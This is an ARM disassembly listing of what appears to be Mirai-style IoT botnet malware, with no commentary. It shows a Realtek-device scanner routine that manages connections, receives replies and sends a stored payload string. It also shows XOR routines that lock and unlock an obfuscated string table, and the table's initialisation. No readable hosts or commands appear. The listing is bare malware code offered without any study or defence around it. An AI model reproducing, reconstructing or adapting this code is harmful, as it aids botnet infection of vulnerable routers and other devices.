   131ec:	e59f1254 	ldr	r1, [pc, #596]	; 13448 <realtekscanner_scanner_init+0xae4>
   131f0:	e1a03103 	lsl	r3, r3, #2
   131f4:	e5918000 	ldr	r8, [r1]
   131f8:	e0643003 	rsb	r3, r4, r3
   131fc:	e1a07183 	lsl	r7, r3, #3
   13200:	e7970008 	ldr	r0, [r7, r8]
   13204:	e3700001 	cmn	r0, #1
   13208:	e0876008 	add	r6, r7, r8
   1320c:	0affffed 	beq	131c8 <realtekscanner_scanner_init+0x864>
   13210:	e1a022a0 	lsr	r2, r0, #5
   13214:	e28d3e72 	add	r3, sp, #1824	; 0x720
   13218:	e2833008 	add	r3, r3, #8
   1321c:	e1a01102 	lsl	r1, r2, #2
   13220:	e0812003 	add	r2, r1, r3
   13224:	e5123124 	ldr	r3, [r2, #-292]	; 0xfffffedc
   13228:	e200401f 	and	r4, r0, #31
   1322c:	e1a03453 	asr	r3, r3, r4
   13230:	e3130001 	tst	r3, #1
   13234:	0affffdc 	beq	131ac <realtekscanner_scanner_init+0x848>
   13238:	e3a0c004 	mov	ip, #4
   1323c:	e1a0200c 	mov	r2, ip
   13240:	e58dc71c 	str	ip, [sp, #1820]	; 0x71c
   13244:	e28dce71 	add	ip, sp, #1808	; 0x710
   13248:	e28d3e72 	add	r3, sp, #1824	; 0x720
   1324c:	e28cc00c 	add	ip, ip, #12
   13250:	e3a04000 	mov	r4, #0
   13254:	e3a01001 	mov	r1, #1
   13258:	e58d4720 	str	r4, [sp, #1824]	; 0x720
   1325c:	e58dc000 	str	ip, [sp]
   13260:	eb000e84 	bl	16c78 <getsockopt>
   13264:	e59d3720 	ldr	r3, [sp, #1824]	; 0x720
   13268:	e1900003 	orrs	r0, r0, r3
   1326c:	1a00006c 	bne	13424 <realtekscanner_scanner_init+0xac0>
   13270:	e5963008 	ldr	r3, [r6, #8]
   13274:	e3530002 	cmp	r3, #2
   13278:	0a000050 	beq	133c0 <realtekscanner_scanner_init+0xa5c>
   1327c:	e3530003 	cmp	r3, #3
   13280:	0a000067 	beq	13424 <realtekscanner_scanner_init+0xac0>
   13284:	e7973008 	ldr	r3, [r7, r8]
   13288:	e1a022a3 	lsr	r2, r3, #5
   1328c:	e203401f 	and	r4, r3, #31
   13290:	e1a01102 	lsl	r1, r2, #2
   13294:	e3a03002 	mov	r3, #2
   13298:	e5863008 	str	r3, [r6, #8]
   1329c:	eaffffc2 	b	131ac <realtekscanner_scanner_init+0x848>
   132a0:	03a03068 	moveq	r3, #104	; 0x68
   132a4:	058a3000 	streq	r3, [sl]
   132a8:	0a000004 	beq	132c0 <realtekscanner_scanner_init+0x95c>
   132ac:	e3700001 	cmn	r0, #1
   132b0:	1a000023 	bne	13344 <realtekscanner_scanner_init+0x9e0>
   132b4:	e59a3000 	ldr	r3, [sl]
   132b8:	e353000b 	cmp	r3, #11
   132bc:	0affffc1 	beq	131c8 <realtekscanner_scanner_init+0x864>
   132c0:	e5963008 	ldr	r3, [r6, #8]
   132c4:	e3530002 	cmp	r3, #2
   132c8:	1a000032 	bne	13398 <realtekscanner_scanner_init+0xa34>
   132cc:	e5960000 	ldr	r0, [r6]
   132d0:	eb001ada 	bl	19e40 <__GI___libc_close>
   132d4:	e1a00006 	mov	r0, r6
   132d8:	ebfffd6c 	bl	12890 <realtekscanner_setup_connection>
   132dc:	e5963008 	ldr	r3, [r6, #8]
   132e0:	e3530000 	cmp	r3, #0
   132e4:	0affffb7 	beq	131c8 <realtekscanner_scanner_init+0x864>
   132e8:	e5963014 	ldr	r3, [r6, #20]
   132ec:	e3530c01 	cmp	r3, #256	; 0x100
   132f0:	12865018 	addne	r5, r6, #24
   132f4:	0a00001e 	beq	13374 <realtekscanner_scanner_init+0xa10>
   132f8:	e3a07000 	mov	r7, #0
   132fc:	e58a7000 	str	r7, [sl]
   13300:	e5962014 	ldr	r2, [r6, #20]
   13304:	e0854002 	add	r4, r5, r2
   13308:	e5960000 	ldr	r0, [r6]
   1330c:	e2622c01 	rsb	r2, r2, #256	; 0x100
   13310:	e1a01004 	mov	r1, r4
   13314:	e3a03901 	mov	r3, #16384	; 0x4000
   13318:	eb000e89 	bl	16d44 <__libc_recv>
   1331c:	e3500000 	cmp	r0, #0
   13320:	daffffde 	ble	132a0 <realtekscanner_scanner_init+0x93c>
   13324:	e1a02007 	mov	r2, r7
   13328:	e7d23004 	ldrb	r3, [r2, r4]
   1332c:	e3530000 	cmp	r3, #0
   13330:	02833041 	addeq	r3, r3, #65	; 0x41
   13334:	07c23004 	strbeq	r3, [r2, r4]
   13338:	e2822001 	add	r2, r2, #1
   1333c:	e1520000 	cmp	r2, r0
   13340:	1afffff8 	bne	13328 <realtekscanner_scanner_init+0x9c4>
   13344:	e59f10f8 	ldr	r1, [pc, #248]	; 13444 <realtekscanner_scanner_init+0xae0>
   13348:	e5963014 	ldr	r3, [r6, #20]
   1334c:	e5912000 	ldr	r2, [r1]
   13350:	e0833000 	add	r3, r3, r0
   13354:	e5863014 	str	r3, [r6, #20]
   13358:	e5862004 	str	r2, [r6, #4]
   1335c:	e1a00005 	mov	r0, r5
   13360:	eb0005f0 	bl	14b28 <util_strlen>
   13364:	e3a03000 	mov	r3, #0
   13368:	e0860000 	add	r0, r6, r0
   1336c:	e5c03018 	strb	r3, [r0, #24]
   13370:	eaffffd9 	b	132dc <realtekscanner_scanner_init+0x978>
   13374:	e2865018 	add	r5, r6, #24
   13378:	e1a00005 	mov	r0, r5
   1337c:	e2861058 	add	r1, r6, #88	; 0x58
   13380:	e3a020c0 	mov	r2, #192	; 0xc0
   13384:	eb000d4d 	bl	168c0 <__GI_memmove>
   13388:	e5963014 	ldr	r3, [r6, #20]
   1338c:	e2433040 	sub	r3, r3, #64	; 0x40
   13390:	e5863014 	str	r3, [r6, #20]
   13394:	eaffffd7 	b	132f8 <realtekscanner_scanner_init+0x994>
   13398:	e5960000 	ldr	r0, [r6]
   1339c:	eb001aa7 	bl	19e40 <__GI___libc_close>
   133a0:	e3a03000 	mov	r3, #0
   133a4:	e3e02000 	mvn	r2, #0
   133a8:	e5863008 	str	r3, [r6, #8]
   133ac:	e5862000 	str	r2, [r6]
   133b0:	e1a00005 	mov	r0, r5
   133b4:	e3a01c01 	mov	r1, #256	; 0x100
   133b8:	eb0005ff 	bl	14bbc <util_zero>
   133bc:	eaffff81 	b	131c8 <realtekscanner_scanner_init+0x864>
   133c0:	e2864f46 	add	r4, r6, #280	; 0x118
   133c4:	e59f108c 	ldr	r1, [pc, #140]	; 13458 <realtekscanner_scanner_init+0xaf4>
   133c8:	e1a00004 	mov	r0, r4
   133cc:	eb0005df 	bl	14b50 <util_strcpy>
   133d0:	e1a00004 	mov	r0, r4
   133d4:	e7975008 	ldr	r5, [r7, r8]
   133d8:	eb0005d2 	bl	14b28 <util_strlen>
   133dc:	e3a03901 	mov	r3, #16384	; 0x4000
   133e0:	e1a02000 	mov	r2, r0
   133e4:	e1a01004 	mov	r1, r4
   133e8:	e1a00005 	mov	r0, r5
   133ec:	eb000eb5 	bl	16ec8 <__libc_send>
   133f0:	e1a00004 	mov	r0, r4
   133f4:	e3a01b01 	mov	r1, #1024	; 0x400
   133f8:	eb0005ef 	bl	14bbc <util_zero>
   133fc:	e3a01c01 	mov	r1, #256	; 0x100
   13400:	e2860018 	add	r0, r6, #24
   13404:	eb0005ec 	bl	14bbc <util_zero>
   13408:	e7970008 	ldr	r0, [r7, r8]
   1340c:	eb001a8b 	bl	19e40 <__GI___libc_close>
   13410:	e1a00006 	mov	r0, r6
   13414:	ebfffd1d 	bl	12890 <realtekscanner_setup_connection>
   13418:	e3a03003 	mov	r3, #3
   1341c:	e5863008 	str	r3, [r6, #8]
   13420:	eaffff68 	b	131c8 <realtekscanner_scanner_init+0x864>
   13424:	e7970008 	ldr	r0, [r7, r8]
   13428:	eb001a84 	bl	19e40 <__GI___libc_close>
   1342c:	e3e03000 	mvn	r3, #0
   13430:	e7873008 	str	r3, [r7, r8]
   13434:	e5864008 	str	r4, [r6, #8]
   13438:	eaffff62 	b	131c8 <realtekscanner_scanner_init+0x864>
   1343c:	00028d48 	.word	0x00028d48
   13440:	0002b8ac 	.word	0x0002b8ac
   13444:	00028d78 	.word	0x00028d78
   13448:	0002b8b0 	.word	0x0002b8b0
   1344c:	00028d4c 	.word	0x00028d4c
   13450:	00028d50 	.word	0x00028d50
   13454:	55555556 	.word	0x55555556
   13458:	0001f8dc 	.word	0x0001f8dc

0001345c <table_retrieve_val>:
   1345c:	e59f2018 	ldr	r2, [pc, #24]	; 1347c <table_retrieve_val+0x20>
   13460:	e1a00180 	lsl	r0, r0, #3
   13464:	e0803002 	add	r3, r0, r2
   13468:	e3510000 	cmp	r1, #0
   1346c:	11d330b4 	ldrhne	r3, [r3, #4]
   13470:	e7900002 	ldr	r0, [r0, r2]
   13474:	15813000 	strne	r3, [r1]
   13478:	e12fff1e 	bx	lr
   1347c:	0002b8cc 	.word	0x0002b8cc

00013480 <table_lock_val>:
   13480:	e59f3090 	ldr	r3, [pc, #144]	; 13518 <table_lock_val+0x98>
   13484:	e59f2090 	ldr	r2, [pc, #144]	; 1351c <table_lock_val+0x9c>
   13488:	e1a00180 	lsl	r0, r0, #3
   1348c:	e0800003 	add	r0, r0, r3
   13490:	e5921000 	ldr	r1, [r2]
   13494:	e1d030b4 	ldrh	r3, [r0, #4]
   13498:	e1a02421 	lsr	r2, r1, #8
   1349c:	e3530000 	cmp	r3, #0
   134a0:	e1a03821 	lsr	r3, r1, #16
   134a4:	e92d4070 	push	{r4, r5, r6, lr}
   134a8:	e20260ff 	and	r6, r2, #255	; 0xff
   134ac:	e20350ff 	and	r5, r3, #255	; 0xff
   134b0:	e1a04c21 	lsr	r4, r1, #24
   134b4:	e201e0ff 	and	lr, r1, #255	; 0xff
   134b8:	0a000014 	beq	13510 <table_lock_val+0x90>
   134bc:	e3a0c000 	mov	ip, #0
   134c0:	e5902000 	ldr	r2, [r0]
   134c4:	e7dc3002 	ldrb	r3, [ip, r2]
   134c8:	e02e3003 	eor	r3, lr, r3
   134cc:	e7cc3002 	strb	r3, [ip, r2]
   134d0:	e5901000 	ldr	r1, [r0]
   134d4:	e7dc3001 	ldrb	r3, [ip, r1]
   134d8:	e0263003 	eor	r3, r6, r3
   134dc:	e7cc3001 	strb	r3, [ip, r1]
   134e0:	e5902000 	ldr	r2, [r0]
   134e4:	e7dc3002 	ldrb	r3, [ip, r2]
   134e8:	e0253003 	eor	r3, r5, r3
   134ec:	e7cc3002 	strb	r3, [ip, r2]
   134f0:	e5901000 	ldr	r1, [r0]
   134f4:	e7dc3001 	ldrb	r3, [ip, r1]
   134f8:	e0243003 	eor	r3, r4, r3
   134fc:	e7cc3001 	strb	r3, [ip, r1]
   13500:	e1d020b4 	ldrh	r2, [r0, #4]
   13504:	e28cc001 	add	ip, ip, #1
   13508:	e152000c 	cmp	r2, ip
   1350c:	caffffeb 	bgt	134c0 <table_lock_val+0x40>
   13510:	e8bd4070 	pop	{r4, r5, r6, lr}
   13514:	e12fff1e 	bx	lr
   13518:	0002b8cc 	.word	0x0002b8cc
   1351c:	00028a78 	.word	0x00028a78

00013520 <table_unlock_val>:
   13520:	e59f3090 	ldr	r3, [pc, #144]	; 135b8 <table_unlock_val+0x98>
   13524:	e59f2090 	ldr	r2, [pc, #144]	; 135bc <table_unlock_val+0x9c>
   13528:	e1a00180 	lsl	r0, r0, #3
   1352c:	e0800003 	add	r0, r0, r3
   13530:	e5921000 	ldr	r1, [r2]
   13534:	e1d030b4 	ldrh	r3, [r0, #4]
   13538:	e1a02421 	lsr	r2, r1, #8
   1353c:	e3530000 	cmp	r3, #0
   13540:	e1a03821 	lsr	r3, r1, #16
   13544:	e92d4070 	push	{r4, r5, r6, lr}
   13548:	e20260ff 	and	r6, r2, #255	; 0xff
   1354c:	e20350ff 	and	r5, r3, #255	; 0xff
   13550:	e1a04c21 	lsr	r4, r1, #24
   13554:	e201e0ff 	and	lr, r1, #255	; 0xff
   13558:	0a000014 	beq	135b0 <table_unlock_val+0x90>
   1355c:	e3a0c000 	mov	ip, #0
   13560:	e5902000 	ldr	r2, [r0]
   13564:	e7dc3002 	ldrb	r3, [ip, r2]
   13568:	e02e3003 	eor	r3, lr, r3
   1356c:	e7cc3002 	strb	r3, [ip, r2]
   13570:	e5901000 	ldr	r1, [r0]
   13574:	e7dc3001 	ldrb	r3, [ip, r1]
   13578:	e0263003 	eor	r3, r6, r3
   1357c:	e7cc3001 	strb	r3, [ip, r1]
   13580:	e5902000 	ldr	r2, [r0]
   13584:	e7dc3002 	ldrb	r3, [ip, r2]
   13588:	e0253003 	eor	r3, r5, r3
   1358c:	e7cc3002 	strb	r3, [ip, r2]
   13590:	e5901000 	ldr	r1, [r0]
   13594:	e7dc3001 	ldrb	r3, [ip, r1]
   13598:	e0243003 	eor	r3, r4, r3
   1359c:	e7cc3001 	strb	r3, [ip, r1]
   135a0:	e1d020b4 	ldrh	r2, [r0, #4]
   135a4:	e28cc001 	add	ip, ip, #1
   135a8:	e152000c 	cmp	r2, ip
   135ac:	caffffeb 	bgt	13560 <table_unlock_val+0x40>
   135b0:	e8bd4070 	pop	{r4, r5, r6, lr}
   135b4:	e12fff1e 	bx	lr
   135b8:	0002b8cc 	.word	0x0002b8cc
   135bc:	00028a78 	.word	0x00028a78

000135c0 <table_init>:
   135c0:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   135c4:	e3a0000c 	mov	r0, #12
   135c8:	e24dd004 	sub	sp, sp, #4
   135cc:	eb000f34 	bl	172a4 <malloc>
   135d0:	e59f484c 	ldr	r4, [pc, #2124]	; 13e24 <table_init+0x864>
   135d4:	e59f184c 	ldr	r1, [pc, #2124]	; 13e28 <table_init+0x868>
   135d8:	e3a0200c 	mov	r2, #12
   135dc:	e3a0b00c 	mov	fp, #12
   135e0:	e1a05000 	mov	r5, r0
   135e4:	eb00056b 	bl	14b98 <util_memcpy>
   135e8:	e3a00014 	mov	r0, #20
   135ec:	e5845008 	str	r5, [r4, #8]
   135f0:	e1c4b0bc 	strh	fp, [r4, #12]
   135f4:	eb000f2a 	bl	172a4 <malloc>
   135f8:	e59f182c 	ldr	r1, [pc, #2092]	; 13e2c <table_init+0x86c>
   135fc:	e3a02014 	mov	r2, #20
   13600:	e1a05000 	mov	r5, r0
   13604:	eb000563 	bl	14b98 <util_memcpy>
   13608:	e3a02014 	mov	r2, #20
   1360c:	e3a00017 	mov	r0, #23
   13610:	e5845020 	str	r5, [r4, #32]
   13614:	e1c422b4 	strh	r2, [r4, #36]	; 0x24
   13618:	eb000f21 	bl	172a4 <malloc>
   1361c:	e59f180c 	ldr	r1, [pc, #2060]	; 13e30 <table_init+0x870>
   13620:	e3a02017 	mov	r2, #23
   13624:	e1a05000 	mov	r5, r0
   13628:	eb00055a 	bl	14b98 <util_memcpy>
   1362c:	e3a03f73 	mov	r3, #460	; 0x1cc
   13630:	e3a02017 	mov	r2, #23
   13634:	e3a00053 	mov	r0, #83	; 0x53
   13638:	e18420b3 	strh	r2, [r4, r3]
   1363c:	e58451c8 	str	r5, [r4, #456]	; 0x1c8
   13640:	eb000f17 	bl	172a4 <malloc>
   13644:	e59f17e8 	ldr	r1, [pc, #2024]	; 13e34 <table_init+0x874>
   13648:	e3a02053 	mov	r2, #83	; 0x53
   1364c:	e1a05000 	mov	r5, r0
   13650:	eb000550 	bl	14b98 <util_memcpy>
   13654:	e3a03f75 	mov	r3, #468	; 0x1d4
   13658:	e3a02053 	mov	r2, #83	; 0x53
   1365c:	e3a00020 	mov	r0, #32
   13660:	e18420b3 	strh	r2, [r4, r3]
   13664:	e58451d0 	str	r5, [r4, #464]	; 0x1d0
   13668:	eb000f0d 	bl	172a4 <malloc>
   1366c:	e59f17c4 	ldr	r1, [pc, #1988]	; 13e38 <table_init+0x878>
   13670:	e3a02020 	mov	r2, #32
   13674:	e1a05000 	mov	r5, r0
   13678:	eb000546 	bl	14b98 <util_memcpy>
   1367c:	e3a03f77 	mov	r3, #476	; 0x1dc
   13680:	e3a02020 	mov	r2, #32
   13684:	e3a00030 	mov	r0, #48	; 0x30
   13688:	e18420b3 	strh	r2, [r4, r3]
   1368c:	e58451d8 	str	r5, [r4, #472]	; 0x1d8
   13690:	eb000f03 	bl	172a4 <malloc>
   13694:	e59f17a0 	ldr	r1, [pc, #1952]	; 13e3c <table_init+0x87c>
   13698:	e3a02030 	mov	r2, #48	; 0x30
   1369c:	e1a05000 	mov	r5, r0
   136a0:	eb00053c 	bl	14b98 <util_memcpy>
   136a4:	e3a03f79 	mov	r3, #484	; 0x1e4
   136a8:	e3a02030 	mov	r2, #48	; 0x30
   136ac:	e1a0000b 	mov	r0, fp
   136b0:	e18420b3 	strh	r2, [r4, r3]
   136b4:	e58451e0 	str	r5, [r4, #480]	; 0x1e0
   136b8:	eb000ef9 	bl	172a4 <malloc>
   136bc:	e59f177c 	ldr	r1, [pc, #1916]	; 13e40 <table_init+0x880>
   136c0:	e1a0200b 	mov	r2, fp
   136c4:	e1a05000 	mov	r5, r0
   136c8:	eb000532 	bl	14b98 <util_memcpy>
   136cc:	e3a03f7b 	mov	r3, #492	; 0x1ec
   136d0:	e3a00009 	mov	r0, #9
   136d4:	e184b0b3 	strh	fp, [r4, r3]
   136d8:	e58451e8 	str	r5, [r4, #488]	; 0x1e8
   136dc:	eb000ef0 	bl	172a4 <malloc>
   136e0:	e59f175c 	ldr	r1, [pc, #1884]	; 13e44 <table_init+0x884>
   136e4:	e3a02009 	mov	r2, #9
   136e8:	e1a05000 	mov	r5, r0
   136ec:	eb000529 	bl	14b98 <util_memcpy>
   136f0:	e3a03f7d 	mov	r3, #500	; 0x1f4
   136f4:	e3a02009 	mov	r2, #9
   136f8:	e3a0000a 	mov	r0, #10
   136fc:	e18420b3 	strh	r2, [r4, r3]
   13700:	e58451f0 	str	r5, [r4, #496]	; 0x1f0
   13704:	eb000ee6 	bl	172a4 <malloc>
   13708:	e59f1738 	ldr	r1, [pc, #1848]	; 13e48 <table_init+0x888>
   1370c:	e3a0200a 	mov	r2, #10
   13710:	e1a05000 	mov	r5, r0
   13714:	eb00051f 	bl	14b98 <util_memcpy>
   13718:	e3a03f7f 	mov	r3, #508	; 0x1fc
   1371c:	e3a0200a 	mov	r2, #10
   13720:	e1a0000b 	mov	r0, fp
   13724:	e18420b3 	strh	r2, [r4, r3]
   13728:	e58451f8 	str	r5, [r4, #504]	; 0x1f8
   1372c:	eb000edc 	bl	172a4 <malloc>
   13730:	e59f1714 	ldr	r1, [pc, #1812]	; 13e4c <table_init+0x88c>
   13734:	e1a0200b 	mov	r2, fp
   13738:	e1a05000 	mov	r5, r0
   1373c:	eb000515 	bl	14b98 <util_memcpy>
   13740:	e3a03f81 	mov	r3, #516	; 0x204
   13744:	e3a00010 	mov	r0, #16
   13748:	e184b0b3 	strh	fp, [r4, r3]
   1374c:	e5845200 	str	r5, [r4, #512]	; 0x200
   13750:	eb000ed3 	bl	172a4 <malloc>
   13754:	e59f16f4 	ldr	r1, [pc, #1780]	; 13e50 <table_init+0x890>
   13758:	e3a02010 	mov	r2, #16
   1375c:	e3a07010 	mov	r7, #16
   13760:	e1a05000 	mov	r5, r0
   13764:	eb00050b 	bl	14b98 <util_memcpy>
   13768:	e3a03f83 	mov	r3, #524	; 0x20c
   1376c:	e3a00013 	mov	r0, #19
   13770:	e18470b3 	strh	r7, [r4, r3]
   13774:	e5845208 	str	r5, [r4, #520]	; 0x208
   13778:	eb000ec9 	bl	172a4 <malloc>
   1377c:	e59f16d0 	ldr	r1, [pc, #1744]	; 13e54 <table_init+0x894>
   13780:	e3a02013 	mov	r2, #19
   13784:	e1a05000 	mov	r5, r0
   13788:	eb000502 	bl	14b98 <util_memcpy>
   1378c:	e3a03f85 	mov	r3, #532	; 0x214
   13790:	e3a02013 	mov	r2, #19
   13794:	e3a00008 	mov	r0, #8
   13798:	e18420b3 	strh	r2, [r4, r3]
   1379c:	e5845210 	str	r5, [r4, #528]	; 0x210
   137a0:	eb000ebf 	bl	172a4 <malloc>
   137a4:	e59f16ac 	ldr	r1, [pc, #1708]	; 13e58 <table_init+0x898>
   137a8:	e3a02008 	mov	r2, #8
   137ac:	e3a09008 	mov	r9, #8
   137b0:	e1a05000 	mov	r5, r0
   137b4:	eb0004f7 	bl	14b98 <util_memcpy>
   137b8:	e3a03f87 	mov	r3, #540	; 0x21c
   137bc:	e3a0000b 	mov	r0, #11
   137c0:	e18490b3 	strh	r9, [r4, r3]
   137c4:	e5845218 	str	r5, [r4, #536]	; 0x218
   137c8:	eb000eb5 	bl	172a4 <malloc>
   137cc:	e59f1688 	ldr	r1, [pc, #1672]	; 13e5c <table_init+0x89c>
   137d0:	e3a0200b 	mov	r2, #11
   137d4:	e1a05000 	mov	r5, r0
   137d8:	eb0004ee 	bl	14b98 <util_memcpy>
   137dc:	e3a03f89 	mov	r3, #548	; 0x224
   137e0:	e3a0200b 	mov	r2, #11
   137e4:	e1a0000b 	mov	r0, fp
   137e8:	e18420b3 	strh	r2, [r4, r3]
   137ec:	e5845220 	str	r5, [r4, #544]	; 0x220
   137f0:	eb000eab 	bl	172a4 <malloc>
   137f4:	e59f1664 	ldr	r1, [pc, #1636]	; 13e60 <table_init+0x8a0>
   137f8:	e1a0200b 	mov	r2, fp
   137fc:	e1a05000 	mov	r5, r0
   13800:	eb0004e4 	bl	14b98 <util_memcpy>
   13804:	e3a03f8b 	mov	r3, #556	; 0x22c
   13808:	e3a00012 	mov	r0, #18
   1380c:	e184b0b3 	strh	fp, [r4, r3]
   13810:	e5845228 	str	r5, [r4, #552]	; 0x228
   13814:	eb000ea2 	bl	172a4 <malloc>
   13818:	e59f1644 	ldr	r1, [pc, #1604]	; 13e64 <table_init+0x8a4>
   1381c:	e3a02012 	mov	r2, #18
   13820:	e1a05000 	mov	r5, r0
   13824:	eb0004db 	bl	14b98 <util_memcpy>
   13828:	e3a03f8d 	mov	r3, #564	; 0x234
   1382c:	e3a02012 	mov	r2, #18
   13830:	e3a00019 	mov	r0, #25
   13834:	e18420b3 	strh	r2, [r4, r3]
   13838:	e5845230 	str	r5, [r4, #560]	; 0x230
   1383c:	eb000e98 	bl	172a4 <malloc>
   13840:	e59f1620 	ldr	r1, [pc, #1568]	; 13e68 <table_init+0x8a8>
   13844:	e3a02019 	mov	r2, #25
   13848:	e1a05000 	mov	r5, r0
   1384c:	eb0004d1 	bl	14b98 <util_memcpy>
   13850:	e3a03f8f 	mov	r3, #572	; 0x23c
   13854:	e3a02019 	mov	r2, #25
   13858:	e3a00007 	mov	r0, #7
   1385c:	e18420b3 	strh	r2, [r4, r3]
   13860:	e5845238 	str	r5, [r4, #568]	; 0x238
   13864:	eb000e8e 	bl	172a4 <malloc>
   13868:	e59f15fc 	ldr	r1, [pc, #1532]	; 13e6c <table_init+0x8ac>
   1386c:	e3a02007 	mov	r2, #7
   13870:	e3a06007 	mov	r6, #7
   13874:	e1a05000 	mov	r5, r0
   13878:	eb0004c6 	bl	14b98 <util_memcpy>
   1387c:	e3a00005 	mov	r0, #5
   13880:	e5845028 	str	r5, [r4, #40]	; 0x28
   13884:	e1c462bc 	strh	r6, [r4, #44]	; 0x2c
   13888:	eb000e85 	bl	172a4 <malloc>
   1388c:	e59f15dc 	ldr	r1, [pc, #1500]	; 13e70 <table_init+0x8b0>
   13890:	e3a02005 	mov	r2, #5
   13894:	e3a0a005 	mov	sl, #5
   13898:	e1a05000 	mov	r5, r0
   1389c:	eb0004bd 	bl	14b98 <util_memcpy>
   138a0:	e3a00004 	mov	r0, #4
   138a4:	e5845030 	str	r5, [r4, #48]	; 0x30
   138a8:	e1c4a3b4 	strh	sl, [r4, #52]	; 0x34
   138ac:	eb000e7c 	bl	172a4 <malloc>
   138b0:	e59f15bc 	ldr	r1, [pc, #1468]	; 13e74 <table_init+0x8b4>
   138b4:	e3a02004 	mov	r2, #4
   138b8:	e1a05000 	mov	r5, r0
   138bc:	eb0004b5 	bl	14b98 <util_memcpy>
   138c0:	e3a03004 	mov	r3, #4
   138c4:	e3a0000e 	mov	r0, #14
   138c8:	e1c433bc 	strh	r3, [r4, #60]	; 0x3c
   138cc:	e5845038 	str	r5, [r4, #56]	; 0x38
   138d0:	eb000e73 	bl	172a4 <malloc>
   138d4:	e59f159c 	ldr	r1, [pc, #1436]	; 13e78 <table_init+0x8b8>
   138d8:	e3a0200e 	mov	r2, #14
   138dc:	e1a05000 	mov	r5, r0
   138e0:	eb0004ac 	bl	14b98 <util_memcpy>
   138e4:	e3a0200e 	mov	r2, #14
   138e8:	e3a00006 	mov	r0, #6
   138ec:	e5845040 	str	r5, [r4, #64]	; 0x40
   138f0:	e1c424b4 	strh	r2, [r4, #68]	; 0x44
   138f4:	eb000e6a 	bl	172a4 <malloc>
   138f8:	e59f157c 	ldr	r1, [pc, #1404]	; 13e7c <table_init+0x8bc>
   138fc:	e3a02006 	mov	r2, #6
   13900:	e3a08006 	mov	r8, #6
   13904:	e1a05000 	mov	r5, r0
   13908:	eb0004a2 	bl	14b98 <util_memcpy>
   1390c:	e1a00007 	mov	r0, r7
   13910:	e5845048 	str	r5, [r4, #72]	; 0x48
   13914:	e1c484bc 	strh	r8, [r4, #76]	; 0x4c
   13918:	eb000e61 	bl	172a4 <malloc>
   1391c:	e1a02007 	mov	r2, r7
   13920:	e59f1558 	ldr	r1, [pc, #1368]	; 13e80 <table_init+0x8c0>
   13924:	e1a05000 	mov	r5, r0
   13928:	eb00049a 	bl	14b98 <util_memcpy>
   1392c:	e1a00009 	mov	r0, r9
   13930:	e5845050 	str	r5, [r4, #80]	; 0x50
   13934:	e1c475b4 	strh	r7, [r4, #84]	; 0x54
   13938:	eb000e59 	bl	172a4 <malloc>
   1393c:	e59f1540 	ldr	r1, [pc, #1344]	; 13e84 <table_init+0x8c4>
   13940:	e1a02009 	mov	r2, r9
   13944:	e1a05000 	mov	r5, r0
   13948:	eb000492 	bl	14b98 <util_memcpy>
   1394c:	e1a00009 	mov	r0, r9
   13950:	e5845058 	str	r5, [r4, #88]	; 0x58
   13954:	e1c495bc 	strh	r9, [r4, #92]	; 0x5c
   13958:	eb000e51 	bl	172a4 <malloc>
   1395c:	e59f1524 	ldr	r1, [pc, #1316]	; 13e88 <table_init+0x8c8>
   13960:	e1a02009 	mov	r2, r9
   13964:	e1a05000 	mov	r5, r0
   13968:	eb00048a 	bl	14b98 <util_memcpy>
   1396c:	e1a0000a 	mov	r0, sl
   13970:	e5845060 	str	r5, [r4, #96]	; 0x60
   13974:	e1c496b4 	strh	r9, [r4, #100]	; 0x64
   13978:	eb000e49 	bl	172a4 <malloc>
   1397c:	e59f1508 	ldr	r1, [pc, #1288]	; 13e8c <table_init+0x8cc>
   13980:	e1a0200a 	mov	r2, sl
   13984:	e1a05000 	mov	r5, r0
   13988:	eb000482 	bl	14b98 <util_memcpy>
   1398c:	e1a00008 	mov	r0, r8
   13990:	e5845080 	str	r5, [r4, #128]	; 0x80
   13994:	e1c4a8b4 	strh	sl, [r4, #132]	; 0x84
   13998:	eb000e41 	bl	172a4 <malloc>
   1399c:	e59f14ec 	ldr	r1, [pc, #1260]	; 13e90 <table_init+0x8d0>
   139a0:	e1a02008 	mov	r2, r8
   139a4:	e1a05000 	mov	r5, r0
   139a8:	eb00047a 	bl	14b98 <util_memcpy>
   139ac:	e1a00009 	mov	r0, r9
   139b0:	e5845088 	str	r5, [r4, #136]	; 0x88
   139b4:	e1c488bc 	strh	r8, [r4, #140]	; 0x8c
   139b8:	eb000e39 	bl	172a4 <malloc>
   139bc:	e59f14c0 	ldr	r1, [pc, #1216]	; 13e84 <table_init+0x8c4>
   139c0:	e1a02009 	mov	r2, r9
   139c4:	e1a05000 	mov	r5, r0
   139c8:	eb000472 	bl	14b98 <util_memcpy>
   139cc:	e3a00015 	mov	r0, #21
   139d0:	e5845090 	str	r5, [r4, #144]	; 0x90
   139d4:	e1c499b4 	strh	r9, [r4, #148]	; 0x94
   139d8:	eb000e31 	bl	172a4 <malloc>
   139dc:	e59f14b0 	ldr	r1, [pc, #1200]	; 13e94 <table_init+0x8d4>
   139e0:	e3a02015 	mov	r2, #21
   139e4:	e1a05000 	mov	r5, r0
   139e8:	e087700a 	add	r7, r7, sl
   139ec:	eb000469 	bl	14b98 <util_memcpy>
   139f0:	e3a0001a 	mov	r0, #26
   139f4:	e5845098 	str	r5, [r4, #152]	; 0x98
   139f8:	e1c479bc 	strh	r7, [r4, #156]	; 0x9c
   139fc:	eb000e28 	bl	172a4 <malloc>
   13a00:	e59f1490 	ldr	r1, [pc, #1168]	; 13e98 <table_init+0x8d8>
   13a04:	e3a0201a 	mov	r2, #26
   13a08:	e1a05000 	mov	r5, r0
   13a0c:	eb000461 	bl	14b98 <util_memcpy>
   13a10:	e3a0301a 	mov	r3, #26
   13a14:	e3a00009 	mov	r0, #9
   13a18:	e1c43ab4 	strh	r3, [r4, #164]	; 0xa4
   13a1c:	e58450a0 	str	r5, [r4, #160]	; 0xa0
   13a20:	eb000e1f 	bl	172a4 <malloc>
   13a24:	e59f1470 	ldr	r1, [pc, #1136]	; 13e9c <table_init+0x8dc>
   13a28:	e3a02009 	mov	r2, #9
   13a2c:	e1a05000 	mov	r5, r0
   13a30:	eb000458 	bl	14b98 <util_memcpy>
   13a34:	e3a02009 	mov	r2, #9
   13a38:	e1a00006 	mov	r0, r6
   13a3c:	e58450a8 	str	r5, [r4, #168]	; 0xa8
   13a40:	e1c42abc 	strh	r2, [r4, #172]	; 0xac
   13a44:	eb000e16 	bl	172a4 <malloc>
   13a48:	e1a02006 	mov	r2, r6
